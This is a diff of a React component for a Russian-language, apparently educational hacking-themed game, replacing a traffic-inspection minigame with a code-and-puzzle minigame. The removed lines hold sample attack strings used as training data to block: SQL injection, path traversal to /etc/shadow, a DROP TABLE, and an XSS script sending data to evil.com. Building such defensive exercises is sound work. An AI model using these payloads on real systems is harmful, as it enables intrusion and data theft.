@@ -1,222 +1,161 @@
 import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
-import { Shield, Search, AlertCircle, Check, Terminal, Activity, Skull, Database } from 'lucide-react';
-
-const THREAT_SIGNATURES = [
-    { type: 'SQLi', payload: "POST /login?u=admin&p=' OR '1'='1" },
-    { type: 'XSS', payload: "GET /q=<script>fetch('http://evil.com/leak')</script>" },
-    { type: 'BruteForce', payload: "AUTH_FAIL: admin (Attempt 432/5000)" },
-    { type: 'PathTraversal', payload: "GET /v1/download?file=../../../../etc/shadow" },
-    { type: 'SQLi', payload: "SELECT * FROM users WHERE id=1; DROP TABLE users;" }
-];
+import { Shield, Zap, Activity, Terminal, CheckCircle2, Cpu, HelpCircle, Info, Radio, Lock, Unlock, Hash } from 'lucide-react';
 
 const FirewallMission = ({ username, currentPoints, onComplete }) => {
+    const [stage, setStage] = useState(0); // 0: Intro, 1: Port, 2: Sync, 3: Matrix, 4: Win
+    const [authCode, setAuthCode] = useState("");
+    const [targetCode, setTargetCode] = useState("");
     const [logs, setLogs] = useState([]);
-    const [selectedLog, setSelectedLog] = useState(null);
-    const [feedback, setFeedback] = useState(null);
+    const [frequency, setFrequency] = useState(10);
+    const [matrixClicks, setMatrixClicks] = useState([]);
+    const [showHint, setShowHint] = useState(false);
     const [health, setHealth] = useState(100);
-    const [xp, setXp] = useState(0);
-    const [isFinished, setIsFinished] = useState(false);
-    const [showIntro, setShowIntro] = useState(true);
 
-    const KNOWLEDGE_BASE = {
-        SQLi: { title: "SQL Инъекция", explanation: "Попытка обхода базы данных. Использование 'OR' позволяет зайти без пароля. КРИТИЧНО.", safe: false },
-        XSS: { title: "Cross-Site Scripting", explanation: "Внедрение JS-кода. Позволяет украсть куки и сессии. КРИТИЧНО.", safe: false },
-        BruteForce: { title: "Brute Force", explanation: "Множественные попытки авторизации. Бот подбирает пароль. БЛОКИРОВАТЬ.", safe: false },
-        PathTraversal: { title: "Path Traversal", explanation: "Попытка доступа к системным файлам сервера (../../etc/passwd). ОПАСНО.", safe: false },
-        CLEAN: { title: "Чистый трафик", explanation: "Стандартный системный запрос. Блокировка вызовет отказ в обслуживании (DoS) для клиента.", safe: true }
-    };
+    const TARGET_FREQ = 74; 
+    const TARGET_SEQUENCE = [2, 7, 13, 8]; // Прямой ответ для 3 этапа
 
-    // Логика игры
+    // ЭТАП 1: Генерация логов
     useEffect(() => {
-        if (health <= 0 || isFinished || feedback || showIntro) return;
+        if (stage === 1) {
+            const code = Math.floor(100 + Math.random() * 899).toString();
+            setTargetCode(code);
+            const interval = setInterval(() => {
+                const newLog = `> [${new Date().toLocaleTimeString()}] TRACE_PKG: port_${Math.random() > 0.8 ? code : Math.floor(Math.random()*9000)} -> status_OK`;
+                setLogs(prev => [newLog, ...prev].slice(0, 10));
+            }, 400);
+            return () => clearInterval(interval);
+        }
+    }, [stage]);
 
-        const interval = setInterval(() => {
-            // Теперь вероятность угрозы случайна, нет строгого чередования
-            const isThreat = Math.random() > 0.6; 
-            const signature = isThreat ? THREAT_SIGNATURES[Math.floor(Math.random() * THREAT_SIGNATURES.length)] : null;
-            
-            const newLog = {
-                id: Date.now(),
-                ip: isThreat ? `185.10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}` : `172.16.0.${Math.floor(Math.random()*254)}`,
-                port: signature ? [21, 22, 3306, 3389][Math.floor(Math.random()*4)] : [80, 443, 53][Math.floor(Math.random()*3)],
-                payload: signature ? signature.payload : `GET /static/v${Math.floor(Math.random()*9)}/assets/index.js`,
-                type: signature ? signature.type : "CLEAN",
-                isThreat: isThreat,
-                status: 'PENDING'
-            };
-
-            setLogs(prev => [newLog, ...prev].slice(0, 10));
-
-            // Штраф за игнорирование
-            if (isThreat) {
-                setTimeout(() => {
-                    setLogs(curr => {
-                        const target = curr.find(l => l.id === newLog.id);
-                        if (target && target.status === 'PENDING') {
-                            setHealth(h => Math.max(0, h - 20));
-                        }
-                        return curr;
-                    });
-                }, 10000); 
-            }
-        }, 3000);
-
-        return () => clearInterval(interval);
-    }, [health, isFinished, feedback, showIntro]);
-
-    const handleVerdict = (verdict) => {
-        if (!selectedLog) return;
-        const isCorrect = (verdict === 'BLOCK' && selectedLog.isThreat) || (verdict === 'ALLOW' && !selectedLog.isThreat);
-        
-        setFeedback({ isCorrect, ...KNOWLEDGE_BASE[selectedLog.type] });
-
-        if (isCorrect) setXp(v => v + 300);
-        else setHealth(h => Math.max(0, h - 25));
-
-        setLogs(prev => prev.filter(l => l.id !== selectedLog.id));
-        setSelectedLog(null);
+    const handleAuth = (e) => {
+        setAuthCode(e.target.value);
+        if (e.target.value === targetCode) setStage(2);
     };
 
-    const handleFinalFinish = () => {
-        const totalXP = xp + (health * 5);
-        onComplete(currentPoints + totalXP);
-        setIsFinished(true);
+    // ЭТАП 3: Логика кликов по матрице
+    const handleMatrixClick = (id) => {
+        if (matrixClicks.includes(id)) return;
+        const newClicks = [...matrixClicks, id];
+        setMatrixClicks(newClicks);
+
+        // Проверка последовательности
+        if (newClicks[newClicks.length - 1] !== TARGET_SEQUENCE[newClicks.length - 1]) {
+            setMatrixClicks([]); // Сброс при ошибке
+            setHealth(h => Math.max(0, h - 20));
+        } else if (newClicks.length === 4) {
+            setStage(4);
+        }
     };
 
-    // 1. ЭКРАН ВВОДА
-    if (showIntro) return (
-        <div className="window animate-fade" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', padding: '40px', textAlign: 'center' }}>
-            <Activity size={60} color="#00ff41" style={{ marginBottom: '20px' }} />
-            <h1 className="glitch-text" style={{ color: '#00ff41' }}>МОНИТОРИНГ ПЕРИМЕТРА</h1>
-            <div style={{ maxWidth: '600px', color: '#e0e0e0', lineHeight: '1.8', fontSize: '18px', margin: '20px 0' }}>
-                <p>Анализируйте входящий трафик на наличие вредоносных сигнатур.</p>
-                <p>Блокируйте <b>SQLi, XSS, BruteForce</b> и попытки взлома файловой системы.</p>
-                <p>Пропускайте только чистые системные запросы.</p>
-            </div>
-            <button className="btn-main" onClick={() => setShowIntro(false)}>ИНИЦИАЛИЗАЦИЯ</button>
-        </div>
-    );
-
-    // 2. ЭКРАН ПОРАЖЕНИЯ (Health 0)
-    if (health <= 0) return (
-        <div className="window animate-fade" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', border: '2px solid #ff4d4d' }}>
-            <Skull size={80} color="#ff4d4d" />
-            <h1 className="glitch-text" style={{ color: '#ff4d4d', fontSize: '40px' }}>SYSTEM CRASHED</h1>
-            <p style={{ color: '#ff4d4d' }}>Периметр прорван. Базы данных скомпрометированы.</p>
-            <button className="btn-huge" style={{ background: '#ff4d4d', color: '#000', marginTop: '20px' }} onClick={() => onComplete(currentPoints)}>ПЕРЕЗАГРУЗКА</button>
-        </div>
-    );
-
-    // 3. ЭКРАН ПОБЕДЫ
-    if (isFinished) return (
-        <div className="window success-screen animate-fade" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%' }}>
-            <Shield size={80} color="#00ff41" />
-            <div className="glitch-text" style={{ fontSize: '40px', color: '#00ff41', margin: '20px 0' }}>ACCESS GRANTED</div>
-            <h2>ПЕРИМЕТР ОЧИЩЕН</h2>
-            <p>Заработано XP: {xp + (health * 5)}</p>
-            <button className="btn-huge ready" style={{ marginTop: '20px' }} onClick={() => onComplete(currentPoints + xp + (health * 5))}>ВЕРНУТЬСЯ В ТЕРМИНАЛ</button>
+    if (stage === 0) return (
+        <div className="window animate-fade" style={{ textAlign: 'center', padding: '50px', background: 'radial-gradient(circle, #0a110a 0%, #050505 100%)' }}>
+            <Cpu size={80} color="#00ff41" />
+            <h1 className="glitch-text" style={{ color: '#00ff41', marginTop: '20px' }}>ПРОТОКОЛ: ОВЕРРАЙД</h1>
+            <p style={{ maxWidth: '600px', margin: '30px auto', color: '#888', fontSize: '18px', lineHeight: '1.6' }}>
+                Макс оставил пакет данных в защищенном хранилище. <br/>
+                Система Neocorp обнаружила утечку и активировала 3 уровня защиты. 
+                <br/><br/>
+                <b>Миссия:</b> Перехватить код, синхронизировать частоту и взломать ядро безопасности.
+            </p>
+            <button className="btn-main" onClick={() => setStage(1)}>НАЧАТЬ ПРОНИКНОВЕНИЕ</button>
         </div>
     );
 
     return (
-        <div style={{ display: 'flex', flexDirection: 'column', height: '100%', width: '100%', padding: '10px' }}>
+        <div className="window animate-fade" style={{ display: 'flex', flexDirection: 'column', height: '100%', border: '1px solid #333' }}>
             
-            <AnimatePresence>
-                {feedback && (
-                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.9)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                        <div className="window" style={{ maxWidth: '600px', padding: '40px', border: `2px solid ${feedback.isCorrect ? '#00ff41' : '#ff4d4d'}` }}>
-                            <h2 style={{ color: feedback.isCorrect ? '#00ff41' : '#ff4d4d', display: 'flex', alignItems: 'center', gap: '15px' }}>
-                                {feedback.isCorrect ? <Check /> : <AlertCircle />} {feedback.title}
-                            </h2>
-                            <p style={{ color: '#ccc', margin: '20px 0', fontSize: '18px' }}>{feedback.explanation}</p>
-                            <button className="btn-main" onClick={() => setFeedback(null)}>ДАЛЕЕ</button>
-                        </div>
-                    </motion.div>
-                )}
-            </AnimatePresence>
+            {/* ИНДИКАТОР ЭТАПОВ */}
+            <div className="panel-header" style={{ display: 'flex', justifyContent: 'center', gap: '40px', background: '#0a0a0a', padding: '15px' }}>
+                <span style={{ color: stage >= 1 ? '#00ff41' : '#222' }}>[1] ПОРТ</span>
+                <span style={{ color: stage >= 2 ? '#00ff41' : '#222' }}>[2] СИГНАЛ</span>
+                <span style={{ color: stage >= 3 ? '#00ff41' : '#222' }}>[3] ЯДРО</span>
+                <div style={{ marginLeft: 'auto', color: '#ff4d4d' }}>HEALTH: {health}%</div>
+            </div>
 
-            <div style={{ display: 'grid', gridTemplateColumns: '1fr 450px', gap: '20px', flex: 1, minHeight: 0 }}>
+            <div style={{ flex: 1, padding: '30px', display: 'flex', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
                 
-                <div className="window" style={{ display: 'flex', flexDirection: 'column', minHeight: 0 }}>
-                    <div className="panel-header" style={{ display: 'flex', justifyContent: 'space-between', padding: '15px' }}>
-                        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}><Terminal size={18} /> <span>IPS_MONITOR</span></div>
-                        <div style={{ color: '#00ff41' }}>SCORE: {xp}</div>
-                    </div>
-                    
-                    <div style={{ flex: 1, overflowY: 'auto', padding: '15px' }}>
-                        <AnimatePresence>
-                            {logs.map(log => (
-                                <motion.div 
-                                    key={log.id} layout initial={{ opacity: 0, x: -50 }} animate={{ opacity: 1, x: 0 }}
-                                    onClick={() => setSelectedLog(log)}
-                                    style={{
-                                        display: 'grid', gridTemplateColumns: '130px 1fr 100px', gap: '15px',
-                                        padding: '15px', marginBottom: '10px', background: '#0a0a0a', cursor: 'pointer',
-                                        border: selectedLog?.id === log.id ? '1px solid #00ff41' : '1px solid #222'
-                                    }}
-                                >
-                                    <span style={{ color: '#666', fontSize: '12px' }}>{log.ip}</span>
-                                    <span style={{ color: '#444', overflow: 'hidden', whiteSpace: 'nowrap' }}>PORT: {log.port}</span>
-                                    <span style={{ color: '#00ff41', textAlign: 'right', fontSize: '11px' }}>АНАЛИЗ</span>
-                                </motion.div>
-                            ))}
-                        </AnimatePresence>
-                    </div>
+                {/* ПОМОЩЬ (ПОДСКАЗКА С ОТВЕТОМ) */}
+                <button onClick={() => setShowHint(!showHint)} style={{ position: 'absolute', top: '10px', right: '10px', background: 'none', border: 'none', cursor: 'pointer', zIndex: 10 }}>
+                    <HelpCircle color="#f7b500" size={24} />
+                </button>
 
-                    {xp >= 1500 && (
-                        <div style={{ padding: '20px' }}>
-                            <button className="btn-huge ready" onClick={handleFinalFinish}>ЗАВЕРШИТЬ МИССИЮ</button>
-                        </div>
+                <AnimatePresence>
+                    {showHint && (
+                        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0 }} 
+                            style={{ position: 'absolute', right: '50px', top: '10px', width: '250px', background: '#1a1a00', border: '1px solid #f7b500', padding: '15px', color: '#f7b500', fontSize: '12px', zIndex: 100 }}>
+                            <b>ДЕШИФРОВКА ПОДСКАЗКИ:</b><br/>
+                            {stage === 1 && `Ищите зеленое число в терминале слева (напр: ${targetCode})`}
+                            {stage === 2 && `Установите ползунок на частоту ${TARGET_FREQ} MHz`}
+                            {stage === 3 && `Нажмите кнопки в порядке: Верхний ряд (3-я), Второй ряд (4-я), Нижний ряд (2-я), Третий ряд (1-я)`}
+                        </motion.div>
                     )}
-                </div>
+                </AnimatePresence>
 
-                <div className="window" style={{ display: 'flex', flexDirection: 'column' }}>
-                    <div className="panel-header" style={{ padding: '15px' }}><Search size={16} /> ИНСПЕКТОР</div>
-                    
-                    <div style={{ flex: 1, padding: '25px', display: 'flex', flexDirection: 'column' }}>
-                        {selectedLog ? (
-                            <div className="animate-fade" style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
-                                <div style={{ marginBottom: '20px' }}>
-                                    <label style={{ color: '#444', fontSize: '12px' }}>SOURCE_IP</label>
-                                    <div style={{ fontSize: '20px', color: '#eee' }}>{selectedLog.ip}</div>
-                                </div>
+                {/* ЭТАП 1: ТЕРМИНАЛ */}
+                {stage === 1 && (
+                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 300px', gap: '30px', width: '100%' }}>
+                        <div style={{ background: '#000', padding: '20px', border: '1px solid #222', height: '300px', overflow: 'hidden', fontFamily: 'monospace', fontSize: '13px', color: '#333' }}>
+                            {logs.map((l, i) => <div key={i} style={{ color: l.includes(targetCode) ? '#00ff41' : 'inherit' }}>{l}</div>)}
+                        </div>
+                        <div className="window" style={{ textAlign: 'center', display: 'flex', flexDirection: 'column', justifyContent: 'center' }}>
+                            <Hash size={40} color="#00ff41" style={{ margin: '0 auto 20px' }} />
+                            <h3 style={{ fontSize: '12px', marginBottom: '20px' }}>ВВЕДИТЕ ПОРТ ДОСТУПА</h3>
+                            <input type="text" value={authCode} onChange={handleAuth} maxLength="3" style={{ background: '#000', border: '2px solid #00ff41', color: '#00ff41', padding: '15px', fontSize: '32px', textAlign: 'center', outline: 'none' }} autoFocus />
+                        </div>
+                    </div>
+                )}
 
-                                <div style={{ marginBottom: '20px' }}>
-                                    <label style={{ color: '#444', fontSize: '12px' }}>TARGET_PORT</label>
-                                    <div style={{ fontSize: '20px', color: '#00ff41' }}>{selectedLog.port}</div>
-                                </div>
-
-                                <div style={{ flex: 1 }}>
-                                    <label style={{ color: '#444', fontSize: '12px' }}>DATA_PAYLOAD</label>
-                                    <div style={{ background: '#000', padding: '15px', border: '1px solid #333', marginTop: '5px', wordBreak: 'break-all', fontFamily: 'monospace', color: '#00ff41', fontSize: '14px' }}>
-                                        {selectedLog.payload}
-                                    </div>
-                                </div>
-
-                                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px', marginTop: '20px' }}>
-                                    <button className="btn-action" onClick={() => handleVerdict('ALLOW')} style={{ color: '#4d94ff', borderColor: '#4d94ff' }}>ПРОПУСТИТЬ</button>
-                                    <button className="btn-action" onClick={() => handleVerdict('BLOCK')} style={{ color: '#ff4d4d', borderColor: '#ff4d4d' }}>БЛОКИРОВАТЬ</button>
-                                </div>
-                            </div>
-                        ) : (
-                            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', opacity: 0.1 }}>
-                                <Database size={60} />
-                                <p>ОЖИДАНИЕ ПАКЕТА</p>
-                            </div>
+                {/* ЭТАП 2: ЧАСТОТА (ВИЗУАЛЬНО) */}
+                {stage === 2 && (
+                    <div style={{ textAlign: 'center', width: '100%', maxWidth: '600px' }}>
+                        <Radio size={50} color="#00ff41" style={{ marginBottom: '20px' }} />
+                        <h2>СИНХРОНИЗАЦИЯ ЧАСТОТЫ</h2>
+                        <div style={{ height: '100px', background: '#000', margin: '30px 0', border: '1px solid #222', position: 'relative', overflow: 'hidden', display: 'flex', alignItems: 'center' }}>
+                             {/* Статическая волна */}
+                             <div style={{ width: '100%', height: '2px', background: '#111', position: 'absolute' }} />
+                             <motion.div animate={{ x: [-100, 100] }} transition={{ repeat: Infinity, duration: 0.5 }} style={{ width: '50px', height: '100%', background: 'linear-gradient(90deg, transparent, #00ff41, transparent)', opacity: 0.2 }} />
+                             
+                             <div style={{ width: '100%', fontSize: '40px', fontWeight: 'bold', color: frequency === TARGET_FREQ ? '#00ff41' : '#444', fontFamily: 'monospace' }}>
+                                {100 + frequency}.4 MHz
+                             </div>
+                        </div>
+                        <input type="range" min="0" max="100" value={frequency} onChange={(e) => setFrequency(parseInt(e.target.value))} style={{ width: '100%', accentColor: '#00ff41' }} />
+                        {frequency === TARGET_FREQ && (
+                            <button className="btn-huge ready animate-fade" style={{ marginTop: '30px' }} onClick={() => setStage(3)}>ПОДТВЕРДИТЬ СИГНАЛ</button>
                         )}
                     </div>
+                )}
 
-                    <div style={{ padding: '20px', background: '#0a0a0a', borderTop: '1px solid #222' }}>
-                        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px', fontSize: '12px' }}>
-                            <span>SYSTEM_HEALTH</span>
-                            <span style={{ color: health < 40 ? '#ff4d4d' : '#00ff41' }}>{health}%</span>
+                {/* ЭТАП 3: МАТРИЦА (ЯДРО) */}
+                {stage === 3 && (
+                    <div style={{ textAlign: 'center' }}>
+                        <Lock size={40} color="#ff4d4d" style={{ marginBottom: '20px' }} />
+                        <h2 style={{ marginBottom: '30px' }}>ИНЪЕКЦИЯ КЛЮЧА В ЯДРО</h2>
+                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 80px)', gap: '10px', background: '#0a0a0a', padding: '20px', border: '1px solid #333' }}>
+                            {Array.from({ length: 16 }).map((_, i) => (
+                                <motion.div key={i} whileTap={{ scale: 0.9 }} onClick={() => handleMatrixClick(i + 1)}
+                                    style={{ height: '80px', border: '1px solid #222', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer',
+                                    background: matrixClicks.includes(i + 1) ? '#00ff41' : '#000',
+                                    color: matrixClicks.includes(i + 1) ? '#000' : '#444', fontSize: '18px', fontWeight: 'bold' }}>
+                                    {i + 1}
+                                </motion.div>
+                            ))}
                         </div>
-                        <div style={{ height: '4px', background: '#222', borderRadius: '2px', overflow: 'hidden' }}>
-                            <motion.div animate={{ width: `${health}%`, background: health < 40 ? '#ff4d4d' : '#00ff41' }} style={{ height: '100%' }} />
-                        </div>
+                        <p style={{ marginTop: '20px', color: '#444' }}>Введите 4-значную комбинацию для взлома.</p>
                     </div>
-                </div>
+                )}
+
+                {/* ФИНАЛ */}
+                {stage === 4 && (
+                    <motion.div initial={{ scale: 0.5 }} animate={{ scale: 1 }} style={{ textAlign: 'center' }}>
+                        <CheckCircle2 size={100} color="#00ff41" style={{ margin: '0 auto' }} />
+                        <h1 className="glitch-text" style={{ color: '#00ff41', margin: '30px 0' }}>ДОСТУП ПОЛУЧЕН</h1>
+                        <p style={{ fontSize: '18px', color: '#eee' }}>Защита Neocorp пала. Улика #3 успешно извлечена.</p>
+                        <button className="btn-huge ready" style={{ marginTop: '40px', padding: '20px 60px' }} onClick={() => onComplete(currentPoints + 3000)}>ВЕРНУТЬСЯ В ТЕРМИНАЛ</button>
+                    </motion.div>
+                )}
+
             </div>
         </div>
     );
